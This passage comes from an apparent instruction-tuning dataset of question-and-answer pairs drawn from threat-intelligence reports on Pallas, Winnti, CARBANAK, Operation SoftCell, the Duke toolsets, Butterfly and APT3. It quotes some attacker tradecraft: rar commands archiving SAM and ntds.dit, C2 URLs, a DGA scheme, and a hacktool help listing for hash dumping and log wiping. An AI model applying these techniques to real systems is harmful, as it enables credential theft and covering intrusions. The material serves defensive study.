audio\n\u2022 Retrieve contacts\n\u2022 Scan nearby Wi-Fi access points and exfiltrate information about them, including their BSSID, SSID, authentication, key management, encryption schemes, signal strength, and frequency\n\u2022 Retrieve chat content from secure messaging applications (this only applies when a victim is using a secure messaging app that has been trojanized  with Pallas)\n\u2022 Retrieve device metadata\n\u2022 Retrieve text messages\n\u2022 Retrieve information about all accounts\n\u2022 Send an SMS to an attacker-specified number\n\u2022 Retrieve call logs\n\u2022 Retrieve messages and any corresponding  decryption keys from messaging apps\n\u2022 Retrieve a list of installed packages\n\u2022 Download and install additional apps\n\u2022 Upload attacker specified files\n\u2022 Delete attacker specified files and directories\n\u2022 Harvest credentials via phishing pop-ups\nSmall Headline: C2 Communications with Malware Implants\nAll samples belonging to the Pallas malware family have the same capabilities and functionality described in the previous section. However, obfuscation did differ between them. For reference, code snippets shown in the following section have been taken from a trojanized version of WhatsApp with a package name of com.gbwhatsapp and a SHA1 hash of ed4754effda466b8babf87bcba2717760f112455.\nLike most other surveillanceware, communication with the C2 includes three main phases:\n1. Regular beaconing to the remote HTTP server.\n2. Handling any outstanding attacker specified commands.\n3. Exfiltration / uploading of victim data to C2 servers.\nPallas samples have a number of different entry points via broadcast receivers, specifically the C2 communications reside in the com.receive.MySe.\nIn all Pallas samples Lookout analyzed, domain information and URL paths are hardcoded as encrypted values. The actor uses AES encryption and chose to use the secret key of Bar12345Bar12345 and initialization vector of RandomInitVector, which appears in a post describing how to use AES encryption in Java13 .\nExamples of AES encrypted, base64 encoded domains and URL paths present in some Pallas samples include:\n\u2022 krgbAdOUCGKEnuCRp5s+eE2eMWUktZQR64RBdkNoH/O0NFo9ByRTFhjqa2UX2Y9k\n\u2022 krgbAdOUCGKEnuCRp5s+eA/hX2erfMp+49exa+8zoZgMlBICjGuOSqrvGRCjgrZ4\nThese two examples decrypt to:\n\u2022 https://adobeair[.]net/wp9/add.php\n\u2022 https://adobeair[.]net/wp9/upload.php\nThe general format of Pallas requests can be written as https://adobeair[.]net/<campaign_identifier>/<add.php or upload.php>.\nThe add.php script is used for several operations, including compromised device check-ins as well as C2 instruction execution. We also determined that it is able to retrieve location information (GPS data) and general metadata about a victim's device. The following table provides additional details around the structure of these requests. In all cases, the Content-Type header is set to application/x-www-form-urlencoded. The listed ac parameter identifies the type of request made to the C2.\n13 (<https://stackoverflow.com/questions/15554296/simple-java-aes-encrypt-decrypt-example>)https://stackoverflow.com/questions/15554296/simple-java-aes-encrypt-decrypt-example\nResponses from C2 infrastructure to devices infected with Pallas consist of chunks of data separated by a \"~!\". The following  table shows the commands that are currently supported. Some of these require the victim's device to report back to the C2  and/or upload files to it via HTTP POST requests. The responses to the attacker commands detailed below are handled via the add.php page.\nPallas handles the exfiltrated data server-side via the upload.php script. This accepts HTTP POST requests that have the following headers and structure, where op_id specifies the type of file being uploaded.\nWhen Pallas receives the GALL1 instruction, it uploads exfiltrated data as a zip archive or saves it as a .db file. For most .db files, each line is base64 encoded and prepended with the string \"*#@\". When decoded, each line translates to a piece of exfiltrated data. Each piece of information is associated with a content keyword or data type. This can be represented as follows:\n<DataType><separator>[<field><separator>...<field><separator>]\nAnalysis of all known Pallas samples seen to date has resulted in the identification of the following 10 data types:\n14 (<https://developer.android.com/guide/topics/providers/content-provider-basics.html>)https://developer.android.com/guide/topics/providers/content-provider-basics.html\n15 (<https://developer.android.com/reference/android/provider/ContactsContract.CommonDataKinds.Phone.html>)https://developer.android.com/reference/android/provider/ContactsContract.CommonDataKinds.Phone.html\n16 (<https://developer.android.com/reference/android/provider/CallLog.Calls.html>)https://developer.android.com/reference/android/provider/CallLog.Calls.html\n17 (<https://docs.oracle.com/javase/7/docs/api/java/sql/Date.html>)https://docs.oracle.com/javase/7/docs/api/java/sql/Date.html\n(continued from page 28)\n18 https://developer.android.com/reference/android/net/wifi/ScanResult.html\n\nQuestion: How does the Pallas malware, associated with Dark Caracal, exploit Android devices without relying on zero-day vulnerabilities? Describe the permissions and potential escalation methods used.\n\nAnswer:",
    "output": "Pallas samples primarily rely on the permissions granted at installation to access sensitive user data. These permissions allow the malware to perform various surveillance functions such as taking photos, exfiltrating text messages, retrieving GPS data, activating the microphone, and scanning nearby Wi-Fi access points. Additionally, Pallas has the capability to download and install additional applications or updates, theoretically allowing attackers to push specific exploit modules to compromised devices to gain complete access. This approach demonstrates that advanced exploitation capabilities, like those used by tools such as Pegasus for iOS and Chrysaor for Android, are not essential but can be helpful in certain scenarios.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Games are over: Winnti is now targeting pharmaceutical companies\nFor a long time the (<https://securelist.com/analysis/internal-threats-reports/37029/winnti-more-than-just-a-game/>)Winnti group had been considered as a Chinese threat actor targeting gaming companies specifically. Recently, we've seen information indicating that the scope of targets can be wider and is no longer limited to the entertainment business. We actually track samples of Winnti malware all the time, but so far we haven't been able to catch one with solid clues indicating other targeted industries. Also our visibility as a vendor does not cover every company in the world (at least so far ;)) and the Kaspersky Security Network (KSN) did not reveal other attacks except those against gaming companies. Well, sometimes targeted entities have included telecommunication companies, or better, large holdings, but it seems that at least one of their businesses was in some way related to the production or distribution of computer games.\nThe new sample belongs to one of the Winnti versions described in Novetta's report \u2013 Winnti 3.0. This is one of the Dynamic Link Libraries composing this RAT (Remote Access Trojan) platform \u2013 the worker library (which in essence is the RAT DLL) with the internal name w64.dll and the exported functions work_end and work_start. Since, as usual, this component is stored on the disk with the strings and much of other data in the PE header removed/zeroed, it is impossible to restore the compilation date of this DLL. But this library includes two drivers compiled on August 22 and September 4, 2014. The sample has an encrypted configuration block placed in overlay. This block may include a tag for the sample \u2013 usually it is a campaign ID or victim ID/name. This time the operators put such tag in the configuration and it turned out to be the name of the well-known global pharmaceutical company\nheadquartered in Europe:\nRead the text above and answer this question: Why did the Winnti group expand its target scope beyond gaming companies, and what specific industries were identified as new targets? Additionally, how did the discovery of the Winnti 3.0 sample indicate this shift in focus?",
    "output": "The Winnti group expanded its target scope beyond gaming companies because their interests and objectives evolved over time. Initially known for targeting gaming companies, recent evidence suggests that their scope now includes other industries. One notable example is the pharmaceutical industry. The discovery of a new sample belonging to Winnti 3.0, which is a version of the Remote Access Trojan (RAT), indicated this shift. This sample included an encrypted configuration block with a tag that identified a well-known global pharmaceutical company headquartered in Europe. This tag, typically used as a campaign ID or victim ID/name, confirmed that the Winnti group was now targeting pharmaceutical companies, marking a significant expansion of their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the CARBANAK APT use process injection to evade antivirus detection?",
    "output": "Process injection is a technique used by adversaries to execute arbitrary code in the address space of a separate live process, potentially evading process-based defenses and elevating privileges. In the case of the CARBANAK APT, the source code analysis reveals that the authors use process injection to evade antivirus detection. Specifically, the code contains an evasion technique for Trend Micro's detection of process injection, which mirrors a technique used in another malware that replaces remote heap allocation and a call to CreateRemoteThread with memory mapping and queueing of an asynchronous procedure call via QueueUserAPC. This evasion technique allows the CARBANAK malware to inject code into a legitimate process, masking its execution and potentially evading detection from security products. Furthermore, the use of process injection by CARBANAK highlights the sophistication of the APT, as it demonstrates the ability to adapt and evolve evasion techniques to avoid detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Compressing the Stolen Data\nIn an attempt to hide the contents of the stolen data, the threat actor used to compress and password-protect it. The winrar binaries and compressed data were found (<https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf>)mostly in the , a TTP that was , as well as others. This threat actor is known to stage the data in multi-part archives before exfiltration.\nThe threat actor used the following commands to compress the data.\nrar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].temp\nrar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].csv\nrar a -r -[password] [REDACTED].rar sam system ntds.dit\nCompressed stolen data exfiltrated via web shell.\nThe contents of the compressed data was crucial in understanding the threat actor's motivation for the attack, as well as what type of information they were after.\nBig Headline: hTran\nIn order to exfiltrate data from a network segment not connected to the Internet, the threat actor deployed a modified version of . This 'connection bouncer' tool lets the threat actor redirect ports and connections and obfuscate C2 server traffic. There have been numerous reports of hTran being used by different Chinese threat actors, including: , and DragonOK.\nThe threat actor made some modifications to . Many strings, including the debug messages, were intentionally changed and obfuscated in an attempt to evade detection and thwart efforts to identify the malware by antivirus and researchers.\nObfuscated debug messages.\nSince the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.\nIdentifying modifications in a disassembly of the modified hTran.\nprintf is being called (dubbed by us as \"looks_like_printf\") with output \"C e.\". By looking at the original source code, we were able to identify that this is supposed to be \"Connect error\".\nA section of the source code for hTran.\nMedium Headline: Understanding the Motive\nWhen you think of large breaches to big organizations, the first thing that comes to mind is usually payment data. An organization that provides services to a large customer base has a lot of credit card data, bank account information, and more personal data on its systems. These attacks are usually conducted by a cybercrime group looking to make money.\nIn contrast, when a nation state threat actor is attacking a big organization, the end goal is typically not financial, but rather intellectual property or sensitive information about their clients.\nOne of the most valuable pieces of data that telecommunications providers hold is Call Detail Records (CDRs). CDRs are a large subset of metadata that contains all details about calls, including:\nSource, Destination, and Duration of a Call\nDevice Details\nPhysical Location\nDevice Vendor and Version\nFor a nation state threat actor, obtaining access to this data gives them intimate knowledge of any individuals they wish to target on that network. It lets them answer questions like:\nWho are the individuals talking to?\nWhich devices are the individuals using?\nWhere are the individuals traveling?\nHaving this information becomes particularly valuable when nation-state threat actors are targeting foreign intelligence agents, politicians, opposition candidates in an election, or even law enforcement.\nExample 1: CDR Data\nExample 2: CDR Data\nExample 3: CDR Data\nBeyond targeting individual users, this attack is also alarming because of the threat posed by the control of a telecommunications provider. Telecommunications has become critical infrastructure for the majority of world powers. A threat actor with total access to a telecommunications provider, as is the case here, can attack however they want passively and also actively work to sabotage the network.\nThis attack has widespread implications, not just for individuals, but also for organizations and countries alike. The use of specific tools and the choice to hide ongoing operations for years points to a nation state threat actor, most likely China. This is another form of cyber warfare being used to establish a foothold and gather information undercover until they are ready to strike.\nWant to learn about post-incident review?\nQ: How did the threat actor in Operation SoftCell attempt to hide the contents of the stolen data during compression, and what tools and techniques were used to achieve this?",
    "output": "The threat actor in Operation SoftCell used WinRAR to compress and password-protect the stolen data. They employed specific commands such as 'rar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].temp' and 'rar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].csv'. This technique is known as staging the data in multi-part archives before exfiltration. The use of WinRAR binaries and compressed data was primarily found in the Temp folder, a tactic consistent with other known threat actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does 'The Mask' APT campaign ensure persistence and evasion on compromised systems? Describe the installation process and techniques used.",
    "output": "The 'Careto' software package, part of 'The Mask' APT campaign, ensures persistence through a standalone executable installer. The installer extracts components and sets them up on the victim machine. It is compiled with Visual Studio 2005 and contains encrypted strings and payloads. The installer checks for the presence of a 'BaseNamedObject' EVENT with '*' in the data to avoid multiple installations. It uses a fixed RC4 key for decryption. The payload is installed based on system architecture (32-bit or 64-bit) and Windows version. To evade detection, it assigns the same file timestamp as 'kernel32.dll' and modifies the EXE's resources to mimic legitimate system files. The payload is registered as a COM object via registry entries to maintain persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: GEMINIDUKE\nThe GeminiDuke toolset consists of a core information stealer, a loader and multiple persistence-related components. Unlike CosmicDuke and PinchDuke, GeminiDuke primarily collects information on the victim computer's configuration. The collected details include:\n\u2022 Local user accounts\n\u2022 Network settings\n\u2022 Internet proxy settings\n\u2022 Installed drivers\n\u2022 Running processes\n\u2022 Programs previously executed by users\n\u2022 Programs and services configured to automatically run at startup\n\u2022 Values of environment variables\n\u2022 Files and folders present in any users home folder\n\u2022 Files and folders present in any users My Documents\n\u2022 Programs installed to the Program Files folder\n\u2022 Recently accessed files, folders and programs\nAs is common for malware, the GeminiDuke infostealer uses a mutex to ensure that only one instance of itself is running at a time. What is less common is that the name used for the mutex is often a timestamp. We believe these timestamps to be generated during the compilation of GeminiDuke from the local time of the computer being used.\nComparing the GeminiDuke compilation timestamps, which always reference the time in the UTC+0 timezone, with the local time timestamps used as mutex names, and adjusting for the presumed timezone difference, we note that all of the mutex names reference a time and date that is within seconds of the respective sample's compilation timestamp. Additionally, the apparent  timezone of the timestamps in all of the GeminiDuke samples compiled during the winter is UTC+3, while for samples compiled during the summer, it is UTC+4.\nThe observed timezones correspond to the pre-2011 definition of Moscow Standard Time (MSK), which was UTC+3 during the winter and UTC+4 during the summer. In 2011 MSK stopped following Daylight Saving Time (DST) and was set to UTC+4 year-round, then reset\nto UTC +3 year-round in 2014. Some of the observed GeminiDuke samples that used timestamps as mutex names were compiled while MSK still respected DST and for these samples, the timestamps perfectly align with MSK as it was defined at the time.\nMap of timezones in Russia; \u00a9 (<>)Eric Muller [23] Pink: MSK (UTC +3) ; Orange: UTC +4\nHowever, GeminiDuke samples compiled after MSK was altered still vary the timezone between UTC+3 in the winter and UTC+4 during the summer. While computers using Microsoft Windows automatically adjust for DST, changes in timezone definitions require that an update to Windows be installed. We therefore believe that the Dukes group simply failed to update the computer they were using to compile GeminiDuke samples, so that the timestamps seen in later samples still appear to follow the old definition of Moscow Standard Time.\nThe GeminiDuke infostealer has occasionally been wrapped with a loader that appears to be unique to GeminiDuke and has never been observed being used with any of the other Duke toolsets. GeminiDuke also occasionally embeds additional executables that attempt to achieve persistence on the victim computer. These persistence components appear to be uniquely customized for use with GeminiDuke, but they use many of the same techniques as CosmicDuke persistence components.\nThe CosmicDuke toolset is designed around a main information stealer component. This information stealer is augmented by a variety of components that the toolset operators may selectively include with the main component to provide additional functionalities, such as multiple methods of establishing persistence, as well as modules that attempt to exploit privilege escalation vulnerabilities in order to execute CosmicDuke with higher privileges. CosmicDuke's information stealing functionality includes:\n\u2022 Keylogging\n\u2022 Taking screenshots\n\u2022 Stealing clipboard contents\n\u2022 Stealing user files with file extensions that match a predefined list\n\u2022 Exporting the users cryptographic certificates including private keys\n\u2022 Collecting user credentials, including passwords, for a variety of popular chat and email programs as well as from web browsers\nCosmicDuke may use HTTP, HTTPS, FTP or WebDav to exfiltrate the collected data to a hardcoded C&C server.\nWhile we believe CosmicDuke to be an entirely custom-written toolset with no direct sharing of code with other Duke toolsets, the high-level ways in which many of its features have been implemented appear to be shared with other members of the Duke arsenal.\nSpecifically, the techniques CosmicDuke uses to extract user credentials from targeted software and to detect the presence of analysis tools appear to be based on the techniques used by PinchDuke. Likewise, many of CosmicDuke's persistence components use techniques also used by components associated with GeminiDuke and CozyDuke. In all of these cases, the techniques are the same, but the code itself has been altered to work with the toolset in question, leading to small differences in the final implementation.\nA few of the CosmicDuke samples we discovered also included components that attempt to exploit either of the publicly known CVE-2010-0232 or CVE-2010-4398 privilege escalation vulnerabilities. In the case\nof CVE-2010-0232, the exploit appears to be based directly on the proof of concept code published by security researcher Tavis Ormandy when he disclosed the vulnerability . We believe that the exploit for CVE-2010-4398 was also based on a publicly available proof of concept .\nIn addition to often embedding persistence or privilege escalation components, CosmicDuke has occasionally embedded PinchDuke, GeminiDuke, or MiniDuke components. It should be noted that CosmicDuke does not interoperate with the second, embedded malware in any way other than by writing the malware to disk and executing it. After that, CosmicDuke and the second malware operate entirely independently of each other, including separately contacting their C&C servers. Sometimes, both malware have used the same C&C server, but in other cases, even the servers have been different.\nFinally, it is worth noting that while most of the compilation timestamps for CosmicDuke samples appear to be authentic, we are aware of a few cases of them being forged. One such case was detailed on page 10 as an apparent evasion attempt. Another is a loader variant seen during the spring of 2010 in conjunction with both CosmicDuke and PinchDuke. These loader samples all had compilation timestamps purporting to be from the 24th or the 25th of September, 2001. However, many of these loader samples embed CosmicDuke variants that exploit the CVE-2010-0232 privilege escalation vulnerability thus making it impossible for the compilation timestamps to be authentic.\nMedium Headline: Further reading\n1. Timo Hirvonen; F-Secure Labs; CosmicDuke: Cosmu with a Twist of MiniDuke; published 2 July 2014;\n2. GReAT; Securelist; Miniduke is back: Nemesis Gemina and the Botgen Studio; published 3 July 2014;\nThe MiniDuke toolset consists of multiple downloader and backdoor components, which are commonly referred to as the MiniDuke \"stage 1\", \"stage 2\", and \"stage 3\" components as per Kaspersky's original MiniDuke whitepaper. Additionally, a specific loader is often associated with the MiniDuke toolset and is referred to as the \"MiniDuke loader\".\nWhile the loader has often been used together with other MiniDuke components, it has also commonly been used in conjunction with CosmicDuke and PinchDuke. In fact, the oldest samples of the loader that we have found were used with PinchDuke. To avoid confusion however, we have decided to continue referring to the loader as the \"MiniDuke loader\".\nTwo details about MiniDuke components are worth noting. Firstly, some of the MiniDuke components were written in Assembly language. While many malware were written in Assembly during the 'old days' of curiosity-driven virus writing, it has since become a rarity. Secondly, some of the MiniDuke components do not contain a hardcoded C&C server address, but instead obtain the address of a current C&C server via Twitter. The use of Twitter either to initially obtain the address of a C&C server (or as a backup if no hardcoded primary C&C server responds) is a feature also found in OnionDuke, CozyDuke, and HammerDuke.\nMedium Headline: Further reading\n1. Costin Raiu, Igor Soumenkov, Kurt Baumgartner, Vitaly Kamluk; Kaspersky Lab; The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor; published 27 February 2013;\n2. CrySyS Blog; Miniduke; published 27 February 2013; http://blog.crysys.hu/2013/02/miniduke/\n3. Marius Tivadar, B\u00edr\u00f3 Bal\u00e1zs, Cristian Istrate; BitDefender; A Closer Look at MiniDuke; published April 2013;\n4. CIRCL - Computer Incident Response Center Luxembourg; Analysis Report (TLP:WHITE) Analysis of a stage 3 Miniduke sample; published 30 May 2013;\n5. ESET WeLiveSecurity blog; Miniduke still duking it out; published 20 May 2014;\nCozyDuke is not simply a malware toolset; rather, it is a modular malware platform formed around a core backdoor component. This component can be instructed by the C&C server to download and execute arbitrary modules, and it is these modules that provide CozyDuke with its vast array of functionality. Known CozyDuke modules include:\n\u2022 Command execution module for executing arbitrary Windows Command Prompt commands\n\u2022 Password stealer module\n\u2022 NT LAN Manager (NTLM) hash stealer module\n\u2022 System information gathering module\n\u2022 Screenshot module\nIn addition to modules, CozyDuke can also be instructed to download and execute other, independent executables. In some observed cases, these executables were self-extracting archive files containing common hacking tools, such as PSExec and Mimikatz, combined with script files that execute these tools. In other cases, CozyDuke has been observed downloading and executing tools from other toolsets used by the Dukes such as OnionDuke, SeaDuke, and HammerDuke.\nQ: What is the significance of the mutex names used by the GeminiDuke infostealer, and how do they relate to the compilation timestamps?",
    "output": "The GeminiDuke infostealer uses a mutex to ensure that only one instance of itself runs at a time, and the names used for these mutexes are often timestamps. These timestamps are believed to be generated during the compilation of GeminiDuke from the local time of the computer being used. By comparing the GeminiDuke compilation timestamps with the local time timestamps used as mutex names and adjusting for the presumed timezone difference, it was noted that all of the mutex names reference a time and date that is within seconds of the respective sample's compilation timestamp. The observed timezones correspond to the pre-2011 definition of Moscow Standard Time (MSK), which was UTC+3 during the winter and UTC+4 during the summer. This is significant because it provides insights into the geographical location and operational habits of the Dukes group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nOn May 18, 2016, FireEye Labs observed a suspected Pakistan-based APT group sending spear phishing emails to Indian government officials. This threat actor has been active for several years and conducting suspected intelligence collection operations against South Asian political and military targets.\nThis group frequently uses a toolset that consists of a downloader and modular framework that uses plugins to enhance functionality, ranging from keystroke logging to targeting USB devices. We initially reported on this threat group and their UPDATESEE malware in our FireEye Intelligence Center in February 2016. Proofpoint also discussed the threat actors, whom they call (<https://www.proofpoint.com/us/threat-insight/post/Operation-Transparent-Tribe>)Transparent Tribe, in a March blog post.\nIn this latest incident, the group registered a fake news domain, timesofindiaa[.]in, on May 18, 2016, and then used it to send spear phishing emails to Indian government officials on the same day. The emails referenced the Indian Government's (<http://zeenews.india.com/business/news/economy/7th-pay-commission-govt-employees-likely-to-get-huge-pay-checks-by-june-july-2016_1880390.html>)7th Central Pay Commission (CPC). These Commissions periodically review the pay structure for Indian government and military personnel, a topic that would be of interest to government employees.\nQuestion: How did the suspected Pakistan-based APT group, known as Transparent Tribe, leverage social engineering techniques in their spear-phishing campaign targeting Indian government officials? What specific tactics were employed to increase the likelihood of success?",
    "output": "Answer: The suspected Pakistan-based APT group, known as Transparent Tribe, leveraged social engineering techniques by registering a fake news domain, timesofindiaa[.]in, and using it to send spear-phishing emails to Indian government officials. The emails referenced the Indian Government's 7th Central Pay Commission (CPC), which periodically reviews the pay structure for Indian government and military personnel. This topic was chosen because it would be of significant interest to government employees, increasing the likelihood that they would open the email and engage with its contents. By using a fake domain that mimicked a legitimate news source and discussing a relevant and timely topic, the group aimed to make the emails appear credible and enticing to the targeted individuals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: DGA Algorithm\nThe DGA computes a URL similar to the following:\n\u2022 http://jdk.MD5([MM].[YYYY].[UID AS WIDE-CHARACTER STRING]).org\n[MM] is the current month and [YYYY] is the current year. Note that the value of [UID AS WIDE-CHARACTER STRING] is the value of the UID registry entry, but as a wide characters, so \"07.2014.140...\" would be \"0\\x007\\ x00.\\x002\\x000\\x001\\x004\\x00.\\x001\\x004\\x000\\x00...\" for the purposes of the MD5 calculation.\nFor example, on July 22, 2014 on a system with the UID set to\n\"1401420000c29bfea70f49b94b825e3e7586ce61350\", the DGA URL would be:\n\u2022 http://jdk.MD5(\\'07.2014.1401420000c29bfea70f49b94b825e3e7586ce61350\\').org\nFinally:\n\u2022 http://jdk.20e8ad99287f7fc244651237cbe8292a.org\nNote that some samples use HTTPS instead of HTTP.\nVery Small Headline: C&C commands\nThe following commands implement back door functionality.\n\u2022 cd: Changes current working directory\n\u2022 exec: Executes a file using cmd.exe\n\u2022 install: Sets the registry subkey for persistence. The registry subkey is only set if this command is sent\n\u2022 quit: Ends the back door session\n\u2022 sleeptime: Sets the sleep time between C&C queries\n\u2022 shred: Overwrites file multiple times to perform a forensic-safe delete. Only found in samples with a PE timestamp in 2014\n\u2022 sysinfo: Gathers and reports system information\n\u2022 uninstall: Uninstalls itself\n\u2022 update: Updates itself\n\u2022 url: Updates C&C URL in registry (although this feature appears to be disabled)\n\u2022 wget: Downloads file to infected computer\nVery Small Headline: Hacktool.MultiPurpose\nThe following information is the help output of Hacktool.MultiPurpose:\nVersion: 1.5\nGeneral options\n--install: install server on local host and load it\n--host <host>: hostname or IP (local host if not set)\n--password <password>: server password connection (mandatory)\n--forceload: load server on local host without test\nServer options\n- -cmd: server command:\ndump: dump stuffz\n--sam: fetch LM/NTLM hashes\n--machines: fetch machines hashes\n--history: fetch history for LM/NTLM hashes\n--sh: fetch logon sessions hashes\n--sp: fetch security packages cleartext passwords\n- -accounts: <account list>: with --sam, specify accounts to dump (comma separated)\n--lsa: fetch LSA secrets\n--vnc: fetch VNC server password     pth <PID:USER:DOMAIN:NTLM>: change credentials of PID    startlog: start recording of loggon sessions\nstoplog: stop recording of loggon sessions     getlog: retrieve stored loggon sessions     callback <IP:port>: create a callback to IP:host     ping: ping server     shred <file>: shred a file     remove: cancel null session, clean logs, wipe library     quit: unload library    reboot: reboot windows     info: show info (version, library path, etc.)    listevt: list events logs     showevt <file>[:num]: show <num> last entries in <file> events log (default num: 15)    last [num]: show last <num> login/logoff (default num: all)    cleanlast-user <user>: remove user from security logs    cleanlast-desc <word>: remove word from security logs (in description)    cleanlast-quit <1|0>: enable/disable cleaning ANONYMOUS LOGON entries before quit\nOutput options --------------\n--file <filename>: output filename to dump information in\n--compress: compress data (only used when file is set)\n--encrypt <key>: encrypt data (only used when file is set)\nMisc options\n--print <key>: print a compress and/or encrypted specified file\n--test445: test if port 445 is available on specified host --establishnullsession, --ens: establish a null session on specified host --cancelnullsession, --cns: cancel an established null session with a specified host\n\nBased on the above text, answer a question. What are some of the key commands implemented by the Butterfly backdoor for communication with its Command & Control (C&C) server? Describe what each of these commands does and explain the significance of the 'shred' command in particular.",
    "output": "The Butterfly backdoor implements several commands for communication with its C&C server, including:\\n\\n- cd: Changes the current working directory.\\n- exec: Executes a file using cmd.exe.\\n- install: Sets the registry subkey for persistence.\\n- quit: Ends the backdoor session.\\n- sleeptime: Sets the sleep time between C&C queries.\\n- shred: Overwrites a file multiple times to perform a forensic-safe delete.\\n- sysinfo: Gathers and reports system information.\\n- uninstall: Uninstalls itself.\\n- update: Updates itself.\\n- url: Updates the C&C URL in the registry (though this feature appears to be disabled).\\n- wget: Downloads a file to the infected computer.\\n\\nThe 'shred' command is particularly significant because it ensures that deleted files cannot be easily recovered through forensic analysis. This command overwrites the file multiple times before deleting it, making data recovery much more difficult.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Key Takeaways\nAPT3 is the first threat actor group that has been attributed with a high degree of confidence directly to the Chinese Ministry of State Security (MSS).\nOn May 9, a mysterious group called \"intrusiontruth\" attributed APT3 to a company, Guangzhou Boyu Information Technology Company, based in Guangzhou, China.\nRecorded Future's open source research and analysis has corroborated the company, also known as Boyusec, is working on behalf of the Chinese Ministry of State Security.\nCustomers should re-examine any intrusion activity known or suspected to be APT3 and all activity from associated malware families as well as re-evaluate security controls and policies.\nBig Headline: Analysis\nOn Boyusec's website, the company explicitly identifies two organizations that it cooperatively partners with, (<http://www.gditsec.org.cn/>)and the Guangdong Information Technology Security Evaluation Center (or Guangdong ITSEC).\nScreenshot of Boyusec's website where Huawei and Guangdong ITSEC are identified as collaborative partners.\nIn November 2016, the Washington Free Beacon reported that a (<http://freebeacon.com/national-security/pentagon-links-chinese-cyber-security-firm-beijing-spy-service/>)Pentagon internal intelligence report had exposed a product that Boyusec and Huawei were jointly producing. According to the Pentagon's report, the two companies were working together to produce security products, likely containing a backdoor, that would allow Chinese intelligence \"to capture data and control computer and telecommunications equipment.\" The article quotes government officials and analysts stating that Boyusec and the MSS are \"closely connected,\" and that Boyusec appears to be a cover company for the MSS.\nImagery \u00a92017 DigitalGlobe, Map data \u00a92017\nBoyusec is located in Room 1103 of the Huapu Square West Tower in Guangzhou, China.\nBoyusec's work with its other \"cooperative partner,\" Guangdong ITSEC, has been less well-documented. As will be laid out below, Recorded Future's research has concluded that Guangdong ITSEC is subordinate to an MSS-run organization called China Information Technology Evaluation Center (CNITSEC) and that Boyusec has been working with Guangdong ITSEC on a joint active defense lab since 2014.\nGuangdong ITSEC is one in a nation-wide network of security evaluation centers (<http://news.sina.com.cn/c/2011-05-20/141322500302.shtml>)certified and administered by CNITSEC. According to Chinese (<http://news.enorth.com.cn/system/2011/05/20/006588656.shtml>)state-run media, Guangdong ITSEC became the sixteenth nationwide branch of CNITSEC in May 2011. Guangdong ITSEC's site also lists itself as CNITSEC's (<http://www.gditsec.org.cn/>)Guangdong Office on its header.\nAccording to (<https://books.google.com/books?id=SbDlBgAAQBAJ&dq=china+and+cybersecurity:+espionage>)academic research published in China and Cybersecurity: Espionage, Strategy, and Politics in the Digital Domain, CNITSEC is run by the MSS and houses much of the intelligence service's technical cyber expertise. CNITSEC is used by the MSS to \"conduct vulnerability testing and software reliability assessments.\" Per a (<https://www.theguardian.com/world/us-embassy-cables-documents/214462>)2009 U.S. State Department cable, it is believed China may also use vulnerabilities derived from CNITSEC's activities in intelligence operations. CNITSEC's Director, Wu Shizhong, even self-identifies as MSS, including for his work as a deputy head of China's (<http://www.cesinet.com/itsforum2014/infoz.html>)National Information Security Standards Committee as recently as January 2016.\nRecorded Future research identified (<http://www.jobui.com/job/151158407/>)several job advertisements on Chinese-language job sites such as jobs.zhaopin.com, jobui.com, and kanzhun.com since 2015, Boyusec revealed a collaboratively established joint active defense lab (referred to as an ADUL) with Guangdong ITSEC in 2014. Boyusec stated that the mission of the joint lab was to develop risk-based security technology and to provide users with innovative network defense capabilities.\nJob posting where Boyusec highlights the joint lab with Guangdong ITSEC. The translated text is, \"In 2014, Guangzhou Boyu Information Technology Company and Guangdong ITSEC cooperated closely to establish a joint active defense lab (ADUL).\"\nBig Headline: Conclusion\nThe lifecycle of APT3 is emblematic of how the MSS conducts operations in both the human and cyber domains. According to (<https://www.google.com/#q=%22peter+mattis%22+OR+%22bonnie+glaser%22+OR+%22Bates+Gill%22+OR+%22Nicholas+Eftimiades%22>)scholars of Chinese intelligence, the MSS is composed of (<http://thediplomat.com/2011/10/chinas-misunderstood-spies/?allpages=yes>)national, provincial, and local elements. Many of these elements, especially at the provincial and local levels, include (<https://www.cambridge.org/core/journals/china-quarterly/article/chinese-civilian-foreign-policy-research-institutes-evolving-roles-and-increasing-influence/017116D83D73C6158605E1420A7ACEE4>)organizations with (<https://fas.org/irp/dni/osc/cicir.pdf>)valid public missions to act as a cover for MSS intelligence operations. Some of these (<https://books.google.com/books?id=RbUhAwAAQBAJ&printsec=frontcover&dq=china%27s+security+state&hl=en&sa=X&ved=0ahUKEwj938jmlfLTAhXpgFQKHZsbAqUQ6AEIJjAA#v=onepage&q=china's security state&f=false>)organizations include think tanks such as (<http://www.cicir.ac.cn/>)CICIR, while others include (<http://zwgk.gd.gov.cn/006939748/201009/t20100916_12204.html>)provincial-level governments and (<https://jamestown.org/program/chinas-espionage-against-taiwan-part-ii-chinese-intelligence-collectors/>)local offices.\nIn the case of APT3 and Boyusec, this MSS operational concept serves as a model for understanding the cyber activity and lifecycle:\nWhile Boyusec has a website, an online presence, and a stated \"information security services\" mission, it cites only two partners, Huawei and Guangdong ITSEC.\nIntrusiontruth and the Washington Free Beacon have linked Boyusec to supporting and engaging in cyber activity on behalf of the Chinese intelligence services.\nRecorded Future's open source research has revealed that Boyusec's other partner is a field office for a branch of the MSS. Boyusec and Guangdong ITSEC have been documented working collaboratively together since at least 